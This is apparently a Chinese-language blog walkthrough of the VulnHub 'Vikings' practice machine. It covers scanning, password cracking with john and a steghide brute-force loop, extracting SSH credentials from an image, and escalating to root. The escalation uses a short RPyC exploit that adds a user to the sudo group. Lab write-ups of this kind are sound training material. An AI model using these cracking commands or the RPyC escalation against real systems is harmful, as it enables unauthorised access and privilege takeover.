---
title: VulnHub-9-Vikings
author: 干 脆 面
tags:
  - "靶机\U0001F3AF"
  - "VulnHub\U0001F3AF"
categories:
  - "安全\U0001F510"
top: 13
abbrlink: ae28b72e
date: 2022-03-04 09:10:55
---

>**靶机地址：**https://download.vulnhub.com/vikings/Vikings.ova
>
>**难度等级：**低（中）
>
>**打靶目标：**取得 root 权限 + 2 Flag
<!-- more -->
## 一、信息收集

### 主机发现

```
sudo arp-scan -l
```

![image-20220217092702262](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092702262.png)

### 端口扫描

```
sudo nmap -p- 192.168.137.123
```

![image-20220217092741148](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092741148.png)

### 服务探测

```
sudo nmap -p22,80 -sV -sC 192.168.137.123
```

![image-20220217092915869](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092915869.png)

### 访问80端口

![image-20220217092948159](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217092948159.png)

点击进入site/

![image-20220217093037864](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217093037864.png)

将页面上的信息进行翻译

![image-20220222111544143](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222111544143.png)

查看源码

![image-20220217093454464](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220217093454464.png)

发现页面加载过程中请求了一些js脚本（所以加载较慢），但未发现可利用的信息

### 目录扫描

对网站根目录进行目录扫描

```
gobuster dir -u http://192.168.137.123/ -x txt,html,php -w /usr/share/wordlists/dirb/common.txt
```

![image-20220222112350381](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112350381.png)

对/site进行目录扫描

```
gobuster dir -u http://192.168.137.123/site/ -x txt,html,php -w /usr/share/wordlists/dirb/common.txt
```

![image-20220222112536698](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112536698.png)

发现war.txt，尝试访问

![image-20220222112823666](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112823666.png)

发现该文件内写了类似的路径，继续访问该路径

![image-20220222112919502](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222112919502.png)

### 编码转化

发现了大量编码，尝试解码

![image-20220222113016678](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222113016678.png)

解码后依然很混乱，但是发现开头PK像是文件头，使用熵辅助验证（Entropy模块）

![image-20220222113409855](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222113409855.png)

 熵值大于7.5则大概率是人为创建的，使用Detect File Type模块判断类型

![image-20220222113620160](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220222113620160.png)

该文件应该为一个压缩格式的文件

将其以压缩文件格式保存在本地

![image-20220223152117585](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152117585.png)

![image-20220223152138688](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152138688.png)

打开时发现需要密码解压

![image-20220223152314142](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152314142.png)

### 离线破解zip密码

使用zip2john将a.zip转换为hash

![image-20220223152747104](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223152747104.png)

复制字典 使用john破解

![image-20220223153101010](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223153101010.png)

### 隐写图片信息提取

解压出一张图片 平平无奇

![image-20220223153714291](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223153714291.png)

![image-20220223153736524](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223153736524.png)

猜测有没有可能和图片隐写相关

使用steghide查看是否存在隐藏信息

![image-20220223154437101](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223154437101.png)

发现需要输入密码 初步尝试使用弱口令 未能试出密码

可以尝试使用简单的脚本进行密码爆破

```
for i in $(cat "rockyou.txt"); do steghide extract king -p $i; done
```

### 二进制文件分析提取

这里使用binwalk二进制分析

```
binwalk -B king
```

![image-20220223155430641](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223155430641.png)

分析结果中发现 确实存在压缩文件 有压缩前后大小的信息 且名为user

使用binwalk进行提取

```
binwalk -e king
```

![image-20220223155710305](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223155710305.png)

提取后的zip文件解压后为user文件

查看user文件的类型 发现为txt文件 则尝试查看文件内容

![image-20220223155926469](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223155926469.png)

看到这样的格式不免想到ssh连接 （结合之前端口扫描的22端口） 尝试连接

### ssh登陆floki用户

经过多次尝试最终使用用户名floki和密码f@m0usboatbuilde7成功登陆

![image-20220223161401992](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223161401992.png)

## 二、提权

### sudo提权

简单查看一下当前权限下系统的文件信息

![image-20220223161707403](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223161707403.png)

发现ragnar用户 之前在web页面的文字信息内有提到过ragnar（维京人的领袖）

尝试切换到ragnar用户 失败

```
su ragnar
```

![image-20220223162049251](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162049251.png)

尝试自身有无sudo权限 尝试提权为root 结果显示并非sudo组成员 无法提权

```
sudo -s
```

![image-20220223162131315](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162131315.png)

### 素数查找/科拉茨猜想

再回到当前目录下的文件readme.txt

![image-20220223162328006](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162328006.png)

根据文本内的线索 查看目录下的boat文件的类型

![image-20220223162504160](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162504160.png)

查看目录下的boat文件的内容

![image-20220223162525657](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220223162525657.png)

发现伪代码（开发人员方便理解的代码）

大致意为：

>可打印的字符是你的盟友
>
>将参数num赋值为第29位素数
>
>对参数num进行科拉茨猜想

用python写一个计算素数的脚本寻找第29个素数为109

![image-20220303094526569](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303094526569.png)

![image-20220303094900556](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303094900556.png)

用python写一个对109进行科拉茨猜想的脚本，提示中有可打印的字符，ascii编码最大为255故<256

![image-20220303100126604](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100126604.png)

![image-20220303100152569](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100152569.png)

将打印出来的字符放入CyberChef中

使用From Decimal模块并设置间隔为逗号，再使用Strings模块并选择长度为1的可打印字符

![image-20220303100735715](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100735715.png)

最终再使用Find/Replace模块 将换行符替换为空

![image-20220303100824928](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303100824928.png)

得到最终的字符串`mR)|>^/Gky[gz=\.F#j5P(`

### ssh登陆ragnar用户

尝试使用该字符串作为密码登陆ragnar账号

![image-20220303104008438](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104008438.png)

再次将`mR)|>^/Gky[gz=\.F#j5P(`粘贴输入

![image-20220303104318996](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104318996.png)

成功登入，提示信息显示ragnar用户也不是root用户，没有sudo权限

### Flag1

查看当前目录信息，user.txt内应为第一个flag

![image-20220303104541477](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104541477.png)

查看/etc/passwd文件

![image-20220303104737747](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104737747.png)顺便优化一下shell

```
/bin/bash -i
```

![image-20220303104824167](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303104824167.png)

重新思考之前ssh登陆ragnar账号时，登陆成功后仍需再输入密码，怀疑是存在登陆即运行的程序或进程

查看当前目录下有无隐藏文件

![image-20220303105052770](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303105052770.png)

### Rpc漏洞提权

查看环境变量文件 最终发现在.profile文件内可能存在可利用信息

![image-20220303105227689](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303105227689.png)

发现在ssh登陆后，会安装和配置libpam-umask包，并直接使用**sudo**权限运行了python脚本**/usr/local/bin/rpyc_classic.py**

查看**/usr/local/bin/rpyc_classic.py**

![image-20220303111707601](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303111707601.png)

了解一下rpc（服务端、客户端连接方式等）

https://rpyc.readthedocs.io/en/latest/tutorial/tut1.html

![image-20220303112050194](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303112050194.png)

发现可由客户端将函数传输到服务端并执行

![image-20220303112630757](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303112630757.png)

查看该文件是否有写权限

![image-20220303112323137](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303112323137.png)

普通用户无法写入/更改

整理大致思路：利用客户端可以向服务端传输数据的特性，向服务端传输数据，服务端默认以root权限执行，利用此特性，将ragnar用户添加到sudo组

编写exp

![image-20220303161022685](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161022685.png)

>import rpyc
>def shell():
>    import os
>    os.system("sudo usermod -a -G sudo ragnar")
>conn = rpyc.classic.connect("localhost")
>fn = conn.teleport(shell)
>fn()

查看Rpyc文档内提到的默认服务端口18812是否在本机开启

![image-20220303154936087](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303154936087.png)

```
ss -pantu | grep 18812
```

![image-20220303155200284](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303155200284.png)

结果显示服务端口18812的状态是开启，也就说明服务端是在运行的

执行exp，并重新使用ssh登陆ragnar账号，验证是否成功

![image-20220303160356664](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303160356664.png)

![image-20220303161344973](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161344973.png)

页面提示要以管理员身份运行命令，使用sudo执行命令，这里使用`sudo -s` 执行环境变数中的 SHELL

![image-20220303161509841](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161509841.png)

### Flag2

最终成功提权至root权限并获取第二个flag

![image-20220303161726600](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20220303161726600.png)
